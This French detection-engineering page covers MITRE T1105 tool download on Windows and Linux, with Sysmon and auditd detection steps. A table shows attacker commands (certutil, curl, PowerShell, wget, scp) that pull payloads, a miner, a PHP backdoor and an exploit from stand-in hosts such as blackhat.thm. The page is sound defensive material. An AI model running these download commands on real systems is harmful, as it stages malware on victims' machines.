---
title: "Téléchargement d'outils"
description: "Une fois entré, l'attaquant télécharge sur la machine les outils de la suite (implant de C2, scripts, mineur, rançongiciel) avec des commandes déjà présentes sur le système."
tags: [windows, linux, sysmon, auditd, certutil, curl, wget, scp]
updated: 2026-11-19
draft: false
type: technique
attack_id: T1105
tactic: command-and-control
severity: high
platforms: [Windows, Linux]
data_sources: [Sysmon, auditd, auth.log]
related:
  - 03-menaces-detection/initial-access/piece-jointe-malveillante
  - 03-menaces-detection/impact/minage-de-cryptomonnaie
---

## Description

Une attaque commence avec presque rien : une petite pièce jointe, une session RDP ou SSH sans outils. L'attaquant télécharge ensuite ce dont il a besoin : un script de découverte (Seatbelt), un extracteur de mots de passe (Mimikatz), un RAT (Remcos), un mineur de cryptomonnaie, et en fin de course le rançongiciel. Découper l'attaque en plusieurs fichiers aide à passer l'antivirus et expose moins ses outils s'il est repéré tôt.

Sous Windows, le premier téléchargement est souvent l'**implant de commande et contrôle** (C2) : la pièce jointe le récupère, le cache dans un dossier comme `C:\Temp` et le lance comme un processus à part, qui se connecte à l'attaquant et attend ses ordres. L'attaque continue même si l'utilisateur supprime la pièce jointe. Après une intrusion par RDP, l'attaquant pourrait taper ses commandes dans la session, mais il installe le plus souvent un C2 quand même, pour ne pas perdre l'accès si le RDP est fermé.

| Système | Méthode | Commande |
| --- | --- | --- |
| Windows | certutil | `certutil.exe -urlcache -f https://blackhat.thm/bad.exe good.exe` |
| Windows | curl | `curl.exe https://blackhat.thm/bad.exe -o good.exe` (Windows 10 et suivants) |
| Windows | PowerShell | `powershell -c "Invoke-WebRequest -Uri 'https://blackhat.thm/bad.exe' -OutFile 'good.exe'"` |
| Windows | Interface | Copier-coller par la session RDP, ou téléchargement par le navigateur. |
| Linux | wget | `wget https://github.com/xmrig/[...]/xmrig-x64.tar.gz -O /tmp/miner.tar.gz` |
| Linux | curl | `curl --output /var/www/html/backdoor.php "https://pastebin.thm/yTg0Ah6a"` |
| Linux | SSH | `scp kali@c2server:/home/kali/cve-2021-4034.sh /tmp/cve-2021-4034.sh` (ou SFTP) |

## Ce qu'on observe

**Windows :** l'enchaînement dans Sysmon pour un téléchargement avec curl.

:::etapes
1. **Un interpréteur est lancé**
   Sysmon 1 : `cmd.exe`.
2. **L'outil de téléchargement démarre**
   Sysmon 1 : `curl.exe`, avec l'URL dans la ligne de commande.
3. **Il contacte le serveur**
   Sysmon 22 (requête DNS) et 3 (connexion) depuis `curl.exe`.
4. **Le fichier arrive sur le disque**
   Sysmon 11 : `Image` = `curl.exe`, `TargetFilename` = le fichier téléchargé.
:::

**Linux :** `wget`, `curl` et `scp` apparaissent dans auditd comme toute création de processus, parfois aussi dans l'historique Bash. Sauf dans un cas : si l'attaquant lance `scp` ou `sftp` **depuis sa propre machine** vers la victime, aucune commande n'apparaît chez la victime, seulement une nouvelle connexion SSH. Même principe pour FTP ou SMB.

| Sens du transfert | Où le voir sur la victime |
| --- | --- |
| L'attaquant se connecte à la victime | Une connexion SSH dans `/var/log/auth.log`. |
| La victime se connecte à l'attaquant | La commande `scp` dans auditd. |

Autres indices :

- **Réseau** : téléchargement depuis une IP déjà vue dans des attaques, un domaine suspect (`qfpkvwgq.thm`), ou un service public qui héberge des outils d'attaque comme GitHub.
- **Fichiers** : un nouveau fichier dans un dossier temporaire (`/tmp`, `/var/tmp`), ou au nom qui détonne (`exploit`, `shell.php`, `kF1pBsY5`).
- **Antivirus ou EDR** : une alerte sur le nouveau fichier ou le nouveau processus.

## Détection

### Observateur d'événements (Windows)

Un téléchargement passe par le réseau : partir des connexions et des requêtes DNS.

:::etapes
1. **Trouver la connexion**
   Journal Sysmon, Filter Current Log sur `3` et `22` : quel processus se connecte, vers quel domaine.
2. **Trouver le fichier**
   Find sur le `ProcessId` de ce processus : le fichier écrit (11), et la ligne de commande qui l'a lancé (1).
3. **Trouver la suite**
   Filtre sur `1`, Find sur le nom du fichier téléchargé : a-t-il été lancé ?
:::

### auditd (Linux)

```bash title="les lancements d'un outil de téléchargement"
ausearch -i -x wget
```

Même chose avec `curl` et `scp`. Pour chacun : l'URL ou la source, le fichier écrit et son dossier, puis le parent ([arbre des processus](../../01-fondamentaux/journaux-linux.md#remonter-larbre-des-processus)). Sans commande, chercher une connexion SSH dans `auth.log`.

## Faux positifs

À compléter.

:::piege
**Un domaine de confiance n'innocente pas un téléchargement** : les attaquants récupèrent souvent leurs outils sur GitHub ou d'autres services légitimes. Juger le processus qui se connecte, le domaine et le fichier téléchargé.
:::

## Réponse

À compléter.
